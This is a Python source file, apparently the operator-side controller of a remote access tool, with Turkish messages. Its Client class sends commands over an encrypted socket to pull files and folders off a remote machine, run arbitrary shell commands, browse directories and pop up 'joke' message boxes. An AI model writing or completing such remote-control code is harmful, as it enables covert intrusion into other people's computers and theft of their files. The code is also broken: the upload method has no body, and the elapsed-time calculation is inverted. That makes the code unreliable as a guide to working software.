#!/usr/bin/env python3 

# -*- encoding: utf-8 -*-
import os
import time

from core.utils.printing import *

from core.utils.commons.commands import Commands
from core.utils.commons.commands import ErrorMessages
from core.utils.commons.networking import pack_msg
from core.utils.commons.networking import MARSHALPacker
from core.utils.commons.networking import MARSHALUnpacker
from core.utils.parser import parse_list
from core.utils.parser import parse_header
from core.utils.commons.io_utils import Modes
from core.utils.commons.io_utils import IOUtils
from core.utils.parser import LineParser
from core.utils.parser import dialogs,PreDialogs

from core.utils.commons.socket_utils import SockUtils

class Client:

    def __init__(self,client_sock = None,client_aes_key = None,client_aes_iv = None,auto_exit_on_session = False,max_client_sock_timeout = 60*10) -> None:
        self.__sock = SockUtils(socket_descriptor = client_sock,aes_key = client_aes_key,aes_iv = client_aes_iv,max_timeout = max_client_sock_timeout)
        self.auto_exit_on_session = auto_exit_on_session
    def create_package_request(self,header: str,**commands):
        self.__sock.send(header,**commands)
    def download(self,path: str):
        total_file = 1
        total_dir = 1
        total_received = 1
        to_next = True
        start_time = time.time()
        for obj in self.__sock.recv_until(header=Commands.COMMAND_DO_DOWNLOAD,path=path):
            main_header = obj.header
            data_of_main_header = obj.data
            if main_header == "NULL":
                break
            elif main_header == "invalid_path":
                print_failure("Hata: %s dosyası mevcut değil" % (os.path.basename(path)))
                break
            elif main_header == "read_err":
                print_warning("Hata: %s dosyası okunamadı Devam ediliyor" % (os.path.basename(path)))
                continue
            elif main_header == "file_content":
                filesize = obj.data["filesize"]
                filename = obj.data["filename"]
                if filename == path:
                    if main_header == "file_content":
                        file_data = obj.data["data"]
                        if file_data == b"": continue
                        with IOUtils(file_name=os.path.basename(filename),mode=Modes.MODE_APPEND_AS_BINARY_PLUS) as dest:
                            dest.write(file_data)
                            total_received+=len(file_data)
                        print(f"\r{Color.CYAN}[{Color.YELLOW}*{Color.CYAN}]{Color.NORMAL}[%s %s%s İndirildi (%s)" % (filename,"%",int(total_received/filesize*100),int(total_received/1024)),end="")
                else:
                    basename_of_dirname = os.path.basename(path)
                    path_to_mirror = filename.split(path)[1]
                    compiled_path = os.getcwd() + os.sep + basename_of_dirname + path_to_mirror
                    dirname = os.path.dirname(compiled_path)
                    if not os.path.exists(dirname):
                        print_status("Klasör oluşturuluyor: %s " % (os.path.basename(path)))
                        os.makedirs(dirname)
                    if not os.path.exists(dirname):
                        print_status("Klasör oluşturuluyor: %s " % (dirname))
                        os.makedirs(dirname)
                    if main_header == "file_content":
                        filedata = obj.data["data"]
                        with IOUtils(file_name=compiled_path,mode=Modes.MODE_APPEND_AS_BINARY_PLUS) as dest:
                            dest.write(filedata)
                        total_received+=len(filedata)
                        print_progress("İndiriliyor: %s" % (filename),total_stage=filesize,total_handled_stage=total_received)
                    total_received = 0
        print("\n")
        end_time = time.time()
        ret = int(start_time-end_time)
        ret = ret-ret*2/60
        print_status("%s: %s DK'Da indirildi" % (os.path.basename(path),ret))
    def msgbox(self,line: str):
        p = LineParser(line=line,funcname="msgbox")
        p.new_arguments("-t",name="title",is_required=True)
        p.new_arguments("-text",name="text",is_required=True)
        p.new_arguments("-d",name="dialogs",is_required=True,choices=dialogs)
        ret = p.parse_args()
        if ret:
            self.create_package_request(
                header = Commands.COMMAND_DO_JOKE_MSGBOX,
                title=ret.title,
                text=ret.text,
                dialog=getattr(PreDialogs,ret.dialogs))

    def upload(self,path: str):
    def shell(self,command: str):
        self.create_package_request(
            Commands.COMMAND_DO_SHELL_EXEC,commands=command
        )
        self.__sock.settimeout(15)
        ret = self.__sock.recv()
        header = ret.header
        data = ret.data
        if header == ErrorMessages.ERR_MSG_I_CANT_DO_SHELL_EXEC:
            exc = data["exception"]
            print_failure("Hata %s komutu çalıştırılırken bir hata oluştu: %s" % (command,exc))
        else:
            command_output = data["command_output"]
            print_status(command_output)
    def ls(self,path: str):
        if path == "" :
            path = "." # current path
        self.create_package_request(Commands.COMMAND_DO_LIST_CURRENT_PATH,
        path=path
        )
        ret = self.__sock.recv()
        if not ret is None:
            pkt_header = ret.header
            data = ret.data
            if not pkt_header == ErrorMessages.ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH:
                data = data["data"]
                for p in data:
                    print_status(p)
            else:
                data = data["data"]
                if data == "invalid_path":
                    print_failure("%s Klasör mevcut değil !" % (path))
                elif data == "path_is_not_dir":
                    print_failure("%s Klasör değil !" % (path))
    def cd(self,path: str):
        if not path == "":
            self.create_package_request(
                Commands.COMMAND_DO_CD_PATH,
                cd_to=path
            )
            res = self.__sock.recv()
            if res.header == ErrorMessages.ERR_MSG_I_CANT_DO_CD_PATH:
                exception = res.data["exc"]
                print_failure("Hata %s konumuna şu sebebpten ötürü geçilemedi: %s" % (path,exception))
    def pwd(self,*args):
        self.create_package_request(Commands.COMMAND_DO_GET_PWD)
        ret = self.__sock.recv()
        if ret:
            pwd = ret.data["pwd"]
            print_status("Şuan ki konum: %s" % (pwd))
    def is_online(self) -> bool:
        res = self.__sock.client_is_online()
        return True if res == Commands.COMMAND_CLIENT_ONLINE else False